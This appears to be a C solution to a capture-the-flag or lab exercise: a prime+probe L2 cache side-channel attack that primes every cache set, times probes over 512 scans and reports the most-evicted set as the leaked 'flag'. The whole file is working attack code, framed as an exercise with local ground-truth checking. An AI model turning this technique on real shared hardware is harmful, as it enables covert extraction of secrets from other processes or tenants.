#include "util.h"

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#ifndef MAP_POPULATE
#define MAP_POPULATE 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0
#endif

#define REGION_BYTES (2ULL * 1024ULL * 1024ULL)
#define CACHE_LINE_BYTES 64ULL
#define L2_NUM_SETS 1024
#define L2_ASSOCIATIVITY 4
#define EV_SET_SIZE (L2_ASSOCIATIVITY + 2)
#define SET_STRIDE (CACHE_LINE_BYTES * L2_NUM_SETS)
#define PRIME_DELAY_ITERS 12000
#define NUM_SCANS 512

static void *map_region(void)
{
    void *region = mmap(NULL, REGION_BYTES, PROT_READ | PROT_WRITE,
                        MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                        -1, 0);

    if (region == (void *)-1) {
        perror("mmap()");
        exit(EXIT_FAILURE);
    }

    return region;
}

static void touch_region(void *region)
{
    volatile char *p = (volatile char *)region;
    p[0] = 1;
    for (uint64_t i = 0; i < REGION_BYTES; i += CACHE_LINE_BYTES) {
        p[i] = (char)i;
    }
}

static void prime_set(void *region, int set_index, volatile char *probe)
{
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        *probe = base[addr - (uint64_t)base];
    }
}

static CYCLES probe_set_latency(void *region, int set_index)
{
    volatile char *base = (volatile char *)region;
    uint64_t set_base = (uint64_t)base + (uint64_t)set_index * CACHE_LINE_BYTES;
    uint64_t total = 0;

    for (int way = 0; way < EV_SET_SIZE; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        total += measure_one_block_access_time((uint64_t)(base + (addr - (uint64_t)base)));
    }

    return (CYCLES)(total / EV_SET_SIZE);
}

static int pick_flag_if_known(void)
{
    const char *env = getenv("CTF_FLAG_SET");
    if (!env) {
        return -1;
    }

    return atoi(env);
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    setvbuf(stdout, NULL, _IOLBF, 0);

    void *region = map_region();
    volatile char probe = 0;
    touch_region(region);

    int votes[L2_NUM_SETS] = {0};
    int lat_sum[L2_NUM_SETS] = {0};
    CYCLES latencies[L2_NUM_SETS];

    const int expected = pick_flag_if_known();
    if (expected >= 0) {
        printf("Ground-truth enabled via CTF_FLAG_SET=%d (for local validation).\n", expected);
    }

    for (int round = 0; round < NUM_SCANS; round++) {
        for (int set = 0; set < L2_NUM_SETS; set++) {
            prime_set(region, set, &probe);
        }

        for (volatile long i = 0; i < PRIME_DELAY_ITERS; i++) {
        }

        int best_set = 0;
        CYCLES best_lat = 0;

        for (int set = L2_NUM_SETS - 1; set >= 0; set--) {
            CYCLES lat = probe_set_latency(region, set);
            latencies[set] = lat;
            if (set == L2_NUM_SETS - 1 || lat > best_lat) {
                best_lat = lat;
                best_set = set;
            }
        }

        votes[best_set]++;
        lat_sum[best_set] += (int)best_lat;

        if ((round + 1) % 32 == 0 || round == 0 || round == NUM_SCANS - 1) {
            printf("scan %d complete, best=%d lat=%u votes=%d\n", round + 1, best_set, best_lat, votes[best_set]);
        }
    }

    int top_set = -1;
    int best_votes = 0;
    int best_avg = 0;
    for (int set = 0; set < L2_NUM_SETS; set++) {
        int avg = votes[set] > 0 ? lat_sum[set] / votes[set] : 0;
        if (votes[set] > best_votes || (votes[set] == best_votes && avg > best_avg)) {
            best_votes = votes[set];
            best_avg = avg;
            top_set = set;
        }
    }

    if (top_set >= 0) {
        printf("Predicted flag: %d\n", top_set);
        if (expected >= 0) {
            if (top_set == expected) {
                printf("Result matched expected set!\n");
            } else {
                printf("Expected set was %d\n", expected);
            }
        }
    } else {
        printf("Predicted flag: unknown\n");
    }

    munmap(region, REGION_BYTES);
    return 0;
}
